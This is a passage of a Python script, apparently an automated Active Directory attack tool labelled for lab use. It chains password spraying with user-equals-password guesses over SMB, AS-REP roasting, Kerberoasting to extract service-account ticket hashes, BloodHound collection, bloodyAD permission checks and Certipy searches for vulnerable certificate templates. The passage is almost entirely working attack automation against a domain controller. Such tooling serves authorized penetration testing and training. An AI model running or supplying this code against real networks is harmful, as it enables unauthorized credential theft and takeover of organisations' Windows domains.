        [-] CORP\\Guest:Guest STATUS_LOGON_FAILURE
        [+] CORP\\admin:admin Authenticated!
    """
    if not os.path.exists(file_path):
        print_status(f"\n\n[INFO] Username file '{file_path}' not found; skipping {note}.")
        return

    print_status(f"\n\n[*] Starting {note} (Checking {file_path})...")
    print(colored(f"$ nxc smb {target} -u <user> -p <user> --continue-on-success", "white"))

    with open(file_path, "r", encoding="utf-8") as fh:
        for raw in fh:
            user = raw.strip()
            if not user:
                continue

            cmd = ["nxc", "smb", target, "-u", user, "-p", user, "--continue-on-success"]
            try:
                proc = subprocess.run(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    timeout=timeout,
                )
                output = proc.stdout or ""
            except subprocess.TimeoutExpired:
                print_status(f"[-] {user}:{user} -> timeout after {timeout}s")
                continue
            except Exception as e:
                print_status(f"[-] {user}:{user} -> exception: {e}")
                continue

            # print any line that matches our patterns (print the line exactly)
            for line in output.splitlines():
                if line and _line_matches(line):
                    print_status(line)

    print_status("\n[+] User:user spray finished.")


def user_spraying(r, d, u=None, p=None, k=False, cred_status=None):
    """
    Perform AS-REP roasting and user:user password spraying.
    
    Args:
        r: Target IP address
        d: Domain name (e.g., CORP.LOCAL)
        u: Username (None if no credentials provided)
        p: Password (None if no credentials provided)
        k: Boolean indicating if Kerberos authentication is enabled
        cred_status: Credential validation status from verify_credentials()
                    Values: "no-creds", "ok", "kerberos", "bad", "ambiguous"
    
    Behavior:
        With credentials:
            - Skips if cred_status == "bad"
            - Runs AS-REP roasting with GetNPUsers.py
            - Returns without password spraying (authenticated mode)
        
        Without credentials:
            - Runs AS-REP roasting to find users with pre-auth disabled
            - Attempts user:user password spray using users.txt
    
    Requirements:
        - users.txt must exist for AS-REP roasting
        - Domain must be discovered for GetNPUsers.py
    """
    user_spraying_art = r"""AS-REP Roasting & Credential Spraying
*   *    *  * * * * ***  **     * * *
  ** * **    *     *   *   *  **   * 
 *        **            *    *   *   
*        *                *     *    
 *        *                  *       
           *      *     *  *         
                     *               
    *        *      * **           * 
        *                            
     *        *               *     *
                                 *   
   *   *    *      *     *     *  *  """

    print_header(user_spraying_art)

    # If creds provided, use the cred_status passed from main()
    if u and p:
        if cred_status is None:
            # fallback if main didn't verify: run lightweight verification (existing behavior)
            verify_cmd = ["nxc", "smb", r, "-u", u, "-p", p, "--shares"]
            out, _ = run_command(verify_cmd, "Verify provided credentials (light SMB check)", capture_output=True)
            if out and re.search(r'STATUS_LOGON_FAILURE', out, re.IGNORECASE):
                print_status(colored("\n[-] Provided credentials appear invalid (STATUS_LOGON_FAILURE).", "red"))
                print_status(colored("[-] Skipping GetNPUsers.py and Kerberos AS-REP checks due to invalid credentials.", "red"))
                return
            if out and re.search(r'\[\+\]|Authenticated', out, re.IGNORECASE):
                cred_status = "ok"
            else:
                cred_status = "ambiguous"

        # Now react to the known cred_status (do not re-run the check)
        if cred_status == "bad":
            print_status(colored("\n[-] Provided credentials invalid — skipping AS-REP checks.", "red"))
            return
        elif cred_status in ("ok", "kerberos", "ambiguous"):
            # Proceed with AS-REP checks
            if os.path.exists(USERS_FILE):
                # Check if the script is in Kerberos mode
                if k:
                    # If so, add the -k flag to the command
                    cmd_str = f"GetNPUsers.py {d}/ -no-pass -k -usersfile {USERS_FILE} -dc-ip {r} | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'"
                    run_command(cmd_str, "Find users with Kerberos pre-auth disabled", is_shell_command=True)
                else:
                    # Otherwise, run the standard command without -k
                    cmd_str = f"GetNPUsers.py {d}/ -no-pass -usersfile {USERS_FILE} -dc-ip {r} | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'"
                    run_command(cmd_str, "Find users with Kerberos pre-auth disabled", is_shell_command=True)
            else:
                print_status(f"\n[INFO] '{USERS_FILE}' not found — skipping AS-REP Roasting.")
            
            # This return was causing your password spray to be skipped for authenticated users.
            # It should be removed if you want the subsequent 'try_user_user_file' call to run.
            # For now, keeping it as you had it:
            return

    # No creds -> proceed with spraying (but only if users.txt exists)
    if not os.path.exists(USERS_FILE):
        print_status(f"\n[INFO] Username file '{USERS_FILE}' not present — cannot spray.")
        return

    # Run AS-REP roast check with GetNPUsers.py (preserve existing behavior)
    cmd_str = f"GetNPUsers.py {d}/ -no-pass -usersfile {USERS_FILE} -dc-ip {r} | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'"
    run_command(cmd_str, "Find users with Kerberos pre-auth disabled", is_shell_command=True)

    # Try users in users.txt
    try_user_user_file(USERS_FILE, r, note="Attempt user:user")


def kerberoasting(r, f, d, u, p, k):
    """
    Attempt Kerberoasting attack to extract service account hashes.
    
    Args:
        r: Target IP address
        f: Fully qualified domain name of DC
        d: Domain name
        u: Username
        p: Password
        k: Boolean indicating if Kerberos authentication is enabled
    
    Returns:
        bool: True if NTLM negotiation failed and Kerberos rerun is needed, False otherwise
    
    Behavior:
        - Uses GetUserSPNs.py to request TGS tickets for service accounts
        - Detects if NTLM is disabled (Kerberos-only environment)
        - Triggers script restart with Kerberos if NTLM fails
    
    Output:
        - Service account hashes (if successful)
        - Kerberos requirement detection (if NTLM fails)
    """
    kerberoasting_art = r"""Find SPNs (Kerberoasting)
** *        * **  *  * * 
  *   **   * *  **    *  
     *  *          **    
                  *      
     *  *  *  *    *     
                    *    
   *                     
  *    *  * *  *      *  
*                *      *
      *                * 
          *             *
 *           *  *    *   """
    print_header(kerberoasting_art)

    kerberos_auth = ["-k"] if k else []
    dc_host_name = f

    base_cmd = ["GetUserSPNs.py", f"{d}/{u}:{p}", "-request", "-dc-host", dc_host_name] + kerberos_auth

    # Run the command and capture ALL output (stdout + stderr)
    output, _ = run_command(base_cmd, "Request TGS for service accounts", capture_output=True)

    NTLM_FAILED = "NTLM negotiation failed"
    INVALID_CREDENTIALS = "invalidCredentials"

    if output and (NTLM_FAILED in output or INVALID_CREDENTIALS in output):
        if not k:
            print_status("\n[!] KERBEROS RERUN DETECTED: NTLM negotiation failed.")
            print_status("      Switching entire script to Kerberos authentication for second pass.")
            return True
    return False


def bloodhound(r, f, d, u, p, k):
    bloodhound_art = r"""Collect BloodHound Data
*   **  *   **   * ** *
 ***     ***  * *      
      *        *     * 
                    * *
        *              
* ** **  *           * 
            *  * * *   
    *           *      
 *        **  *        
                       
             *         """
    print_header(bloodhound_art)

    kerberos_auth = ["-k"] if k else []
    
    # Introduce a retry loop
    max_retries = 2 # 1 initial attempt + 1 retry
    current_attempt = 1
    
    while current_attempt <= max_retries:
        print_status(f"[*] Running BloodHound collector (Attempt {current_attempt}/{max_retries})...")
        
        _, return_code = run_command(
            [
                "bloodhound-ce-python",
                "-d", d,
                "-u", u,
                "-p", p,
                "-dc", f,   
                "-ns", r,
                "--dns-timeout", "10",
                "-c", "all",
                "-op", u,
                *kerberos_auth,
                "--zip"
            ],
            "Run BloodHound collector",
            capture_output=True 
        )

        if return_code == 0:
            print_status("\n[+] BloodHound collector finished successfully.")
            return # Exit the function on success
        
        # If it failed, check if we have more retries
        current_attempt += 1
        if current_attempt <= max_retries:
            print_status("[-] BloodHound collector failed. Retrying in 5 seconds...")
            time.sleep(5)
        
    # If the loop finishes without returning, all attempts failed
    print_status("\n[!!!] BLOODHOUND FAILURE DETECTED [!!!]")
    print_status(f"[-] All {max_retries} attempts failed.")
    print_status("[-] Check the output above for reasons like invalid credentials, DNS failure, or network block.")


def bloodyad(r, u, p, k, d, f):
    bloodyad_art = r"""Check Permissions (bloodyAD)
****   *  *  *     *   * ** 
    * * **    **    ***     
           **   *       *   
                         *  
    *      **   *  *        
*  *                *       
         *             *  * 
  *    *       *  *         
              *      **    *
      *                     
 *                *     *  *
        * *  *              """
    print_header(bloodyad_art)

    # Define the Kerberos flag string to be added ONLY if 'k' is True
    kerberos_auth = "-k" if k else ""

    # Construct command, using FQDN (f) as the host for Kerberos and DC IP (r) for the DC-IP.
    # Note: bloodyAD often requires FQDN for the host argument when using Kerberos.
    cmd = f"bloodyAD -u {u} -p {p} {kerberos_auth} -d {d} --dc-ip {r} --host {f} get writable".strip()

    run_command(cmd, "Check for writable objects with bloodyAD", is_shell_command=True)

def adcs_certipy(r, f, d, u, p, k):
    adcs_art = """ADCS Enumeration (Certipy)
***  *   * * *    **  *   
      * * *   **    *  *  
   *   *    *        *  * 
*          *              
   *                      
  *         *     *  *    
 *     **                 
     **  *     * * *      
              *          *
                       *  
                 *      **
          *  *      * *   """
    print_header(adcs_art)

    auth_opts = ["-u", u, "-p", p]
    kerberos_flag_list = ["-k"] if k else []

    # NXC Check (Code unchanged)
    run_command(["nxc", "ldap", r] + auth_opts + kerberos_flag_list + ["-M", "adcs"], "Check for ADCS with nxc")

    # Certipy Find
    if k:
        # Kerberos Auth for Certipy
        certipy_cmd = ["certipy", "find", "-target", f, "-u", f"{u}@{d}", "-p", p, "-k", "-dc-ip", r, "-vulnerable", "-stdout","-ldap-scheme", "ldap"]
        run_command(certipy_cmd, "Find vulnerable cert templates (Kerberos)")
    else:
        # NTLM Auth for Certipy (Also add -no-tls for consistency)
        certipy_cmd = ["certipy", "find", "-u", u, "-p", p, "-dc-ip", r, "-vulnerable", "-stdout", "-ldap-scheme", "ldap"]
        run_command(certipy_cmd, "Find vulnerable cert templates (NTLM)")


def main():
    parser = argparse.ArgumentParser(
        description="Automated Active Directory Enumeration Script for Educational/Lab Use.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""Example Usage:
 Basic: python ad_enum_script_v4.py -r 10.10.10.161
 Auth:  python ad_enum_script_v4.py -r 10.10.10.161 -u 'user' -p 'pass'
"""
    )
    # Core arguments
    parser.add_argument("-r", "--rhosts", help="Target DC IP Address (Required).", required=True)
    parser.add_argument("-d", "--domain", help="Domain name (e.g., CORP.LOCAL). Needed for most checks.")
    parser.add_argument("-f", "--fqdn", help="Fully Qualified Domain Name of DC (e.g., dc01.corp.local). Needed for Kerberos and Certipy.")
    # Standard credentials
    parser.add_argument("-u", "--username", default=USERNAME_DEFAULT, help="Username for authenticated scans.")
    parser.add_argument("-p", "--password", default=PASSWORD_DEFAULT, help="Password for authenticated scans.")


    args = parser.parse_args()

    args.kerberos = False

    # Rerun Loop Setup 
    run_authenticated_checks = True

    while run_authenticated_checks:
        if not args.kerberos:
            ascii_art = r"""                        
                                                        
         .8.          8 888888888o.      8 8888888888   
        .888.         8 8888    `^888.   8 8888         
       :88888.        8 8888        `88. 8 8888         
      . `88888.       8 8888         `88 8 8888         
     .8. `88888.      8 8888          88 8 888888888888 
    .8`8. `88888.     8 8888          88 8 8888         
   .8' `8. `88888.    8 8888         ,88 8 8888         
  .8'   `8. `88888.   8 8888        ,88' 8 8888         
 .888888888. `88888.  8 8888    ,o88P'   8 8888         
.8'       `8. `88888. 8 888888888P'      8 888888888888 
                 
                            by Ｂｌｕｅ  Ｐｈｏ３ｎｉｘ                                      
            """

            # Print the colored ASCII Art
            print(colored("\n" + ascii_art, "magenta"))
            print(colored(f"\n[CONFIG] Target IP:", "blue") + colored(f" {args.rhosts}", "white"))
            print(colored(f"[CONFIG] Domain:", "blue") + colored(f"    {args.domain or 'Not Provided. Script will attempt discovery.'}", "white"))
            print(colored(f"[CONFIG] FQDN:", "blue") + colored(f"      {args.fqdn or 'Not Provided. Script will attempt discovery.'}", "white"))
            print(colored(f"[CONFIG] User:", "blue") + colored(f"      {args.username or 'Anonymous/Guest'}", "white"))
            print(colored(f"[CONFIG] Password:", "blue") + colored(f"  {args.password or 'Not Provided'}", "white"))

        run_authenticated_checks = False
        if not args.kerberos:
            check_dependencies()

        # Check if host is up
        if not args.kerberos:
            if not check_host_nmap(args.rhosts):
                print_status(f"[!] Host Inactive")
                print_status(f"[-] Target IP {args.rhosts} did not respond to nmap scan.")
                print_status("[-] Please check the IP address and network connectivity.")
                sys.exit(1)

        # This discovers domain/fqdn
        if not args.kerberos:
            discovered_domain, discovered_fqdn = domain_discovery(args.rhosts)
            if discovered_domain:
                args.domain = discovered_domain
            if discovered_fqdn:
                args.fqdn = discovered_fqdn
            
        if not args.kerberos:
            # If creds provided, run Kerberos-first verification NOW (this sets args.kerberos when needed)
            cred_status = "no-creds"
            needs_rerun_from_creds = False
            if args.username and args.password:
                cred_status = verify_credentials(args.rhosts, args.username, args.password, args.kerberos, args.fqdn, args.domain)
                if cred_status == "kerberos":
                    needs_rerun_from_creds = True
                    print_status("[+] Credential verification indicates Kerberos required.")
                elif cred_status == "bad":
                    print_status("\n[-] Stopping: invalid credentials supplied. Fix credentials or rerun without them to continue anonymous checks.")
                    sys.exit(1)
                elif cred_status == "ambiguous":
                    print_status("\n[!] Credential verification ambiguous — proceeding but be cautious; you can rerun without creds for anonymous checks.")

            # Check required Kerberos and we're not already in Kerberos mode, restart
            if needs_rerun_from_creds and not args.kerberos and args.username and args.password:
                args.kerberos = True
                print_status("\n[+] Kerberos-only environment detected.")
                print_status("[*] Restarting enumeration with Kerberos enabled.")
                run_authenticated_checks = True
                continue 

        ldap_enumeration(args.rhosts, args.username, args.password, args.kerberos)

        # SMB Enumeration
        smb_enum(args.rhosts, args.fqdn, args.domain, args.username, args.password, args.kerberos)

        # User Spraying / AS-REP Roasting
        if args.domain:
            user_spraying(args.rhosts, args.domain, args.username, args.password, k=args.kerberos, cred_status=cred_status)
        else:
            print_status("\n[!] Skipping User Spraying (AS-REP Roasting), as it requires domain discovery.")

        # Authenticated-only follow-ups
        if not args.username or not args.password:
            print_status("\n[*] No credentials provided. Skipping authenticated checks.")
        elif not args.domain or not args.fqdn:
            print_status("\n[!] Skipping advanced authenticated checks, as they require discovered domain and fqdn.")
        else:
            # Kerberoasting (this can flip to Kerberos if NTLM fails later)
            rerun_kerberos = kerberoasting(
                args.rhosts, args.fqdn, args.domain, args.username, args.password, args.kerberos
            )

            if rerun_kerberos and not args.kerberos:
                print_status("\n[!] NTLM negotiation failed. Switching to Kerberos for all subsequent commands.")
                args.kerberos = True
                run_authenticated_checks = True
                print_status("[*] RESTARTING ENUMERATION WITH KERBEROS ENABLED [*]")
                continue

            # Continue with remaining authenticated tasks
            bloodhound(args.rhosts, args.fqdn, args.domain, args.username, args.password, args.kerberos)
            bloodyad(args.rhosts, args.username, args.password, args.kerberos, args.domain, args.fqdn)
            adcs_certipy(args.rhosts, args.fqdn, args.domain, args.username, args.password, args.kerberos)

    print_status("\n[+] Enumeration script finished.\n")

if __name__ == "__main__":
    main()
